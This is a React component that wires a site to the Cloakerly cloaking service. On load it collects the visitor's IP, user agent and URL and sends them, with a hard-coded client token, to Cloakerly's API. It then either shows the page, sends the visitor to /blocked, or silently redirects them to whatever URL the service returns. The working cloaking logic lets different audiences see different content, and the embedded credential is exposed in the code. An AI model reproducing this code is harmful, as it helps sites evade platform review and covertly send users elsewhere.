'use client';

import React, { useEffect, useState } from 'react';

export default function CloakerlyTrafficFilter({
  children,
}: {
  children: React.ReactNode;
}) {
  const [loading, setLoading] = useState(true);
  const [allowed, setAllowed] = useState(false);

  useEffect(() => {
    const run = async () => {
      try {
        let clientIP = '';
        try {
          const r = await fetch('https://api.ipify.org?format=json');
          const j = await r.json();
          clientIP = j.ip || '';
        } catch (e) {
          console.warn('IP', e);
        }

        const meta =
          document.querySelector<HTMLMetaElement>('meta[name="referrer"]') ??
          (() => {
            const m = document.createElement('meta');
            m.name = 'referrer';
            document.head.appendChild(m);
            return m;
          })();
        meta.content = 'origin';

        const params = new URLSearchParams({
          campaign_id: '140',
          client_token:
            '856176411:ioma0qc1R3ZUKIwiyMjaTbpwB1Of7PhtMhBJDHqxruyPFQTGFDxSY7e0KL9dtVEz',
          ip: clientIP,
          user_agent: navigator.userAgent,
          current_url: window.location.href,
        });

        const response = await fetch(
          'https://api.cloakerly.com/v6/?' + params.toString(),
          { method: 'GET', signal: AbortSignal.timeout(10000) }
        );
        const data = await response.text();

        if (data.startsWith('http')) {
          window.location.href = data;
          return;
        }

        if (data === 'true') {
          setAllowed(true);
          setLoading(false);
        } else {
          window.location.href = '/blocked';
        }
      } catch (e) {
        console.error('Cloakerly', e);
        setAllowed(true);
        setLoading(false);
      }
    };

    run();
  }, []);

  if (loading) return null;
  if (!allowed) return null;

  return <>{children}</>;
}
